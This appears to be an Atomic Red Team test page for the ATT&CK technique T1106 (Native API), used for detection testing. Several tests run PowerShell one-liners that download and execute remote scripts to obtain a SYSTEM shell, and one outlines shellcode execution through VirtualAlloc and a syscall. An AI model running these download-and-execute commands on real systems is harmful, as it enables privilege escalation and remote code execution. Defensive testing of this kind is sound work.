---
tags: [T1106, atomic_test]
filename: "[[T1106 - Native API]]"
---
# T1106 - Native API

## Atomic Test #1 - Execution through API - CreateProcess
Execute program by leveraging Win32 API's. By default, this will launch calc.exe from the command prompt.

**Supported Platforms:** Windows


**auto_generated_guid:** 99be2089-c52d-4a4a-b5c3-261ee42c8b62





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| source_file | Location of the CSharp source file to compile and execute | path | PathToAtomicsFolder&#92;T1106&#92;src&#92;CreateProcess.cs|
| output_file | Location of the payload | path | %tmp%&#92;T1106.exe|


#### Attack Commands: Run with `command_prompt`! 


```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:"#{output_file}" /target:exe "#{source_file}"
%tmp%/T1106.exe
```




#### Dependencies:  Run with `powershell`!
##### Description: #{source_file} must exist on system.
##### Check Prereq Commands:
```powershell
if (Test-Path "#{source_file}") {exit 0} else {exit 1}
```
##### Get Prereq Commands:
```powershell
New-Item -Type Directory (split-path "#{source_file}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1106/src/CreateProcess.cs" -OutFile "#{source_file}"
```




<br/>
<br/>

## Atomic Test #2 - WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique
Get SYSTEM shell - Pop System Shell using CreateProcess technique via function of WinPwn

**Supported Platforms:** Windows


**auto_generated_guid:** ce4e76e6-de70-4392-9efe-b281fc2b4087






#### Attack Commands: Run with `powershell`! 


```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')
```






<br/>
<br/>

## Atomic Test #3 - WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique
Get SYSTEM shell - Bind System Shell using CreateProcess technique via function of WinPwn

**Supported Platforms:** Windows


**auto_generated_guid:** 7ec5b74e-8289-4ff2-a162-b6f286a33abd






#### Attack Commands: Run with `powershell`! 


```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')
```






<br/>
<br/>

## Atomic Test #4 - WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique
Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique via function of WinPwn

**Supported Platforms:** Windows


**auto_generated_guid:** e1f93a06-1649-4f07-89a8-f57279a7d60e






#### Attack Commands: Run with `powershell`! 


```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')
```






<br/>
<br/>

## Atomic Test #5 - Run Shellcode via Syscall in Go
Runs shellcode in the current running process via a syscall.

Steps taken with this technique
1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
3. Change the memory page permissions to Execute/Read with VirtualProtect
4. Use syscall to execute the entrypoint of the shellcode

- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#syscall)

**Supported Platforms:** Windows


**auto_generated_guid:** ae56083f-28d0-417d-84da-df4242da1f7c






#### Attack Commands: Run with `powershell`! 


```powershell
$PathToAtomicsFolder\T1106\bin\x64\syscall.exe -debug
```

#### Cleanup Commands:
```powershell
Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
```





<br/>
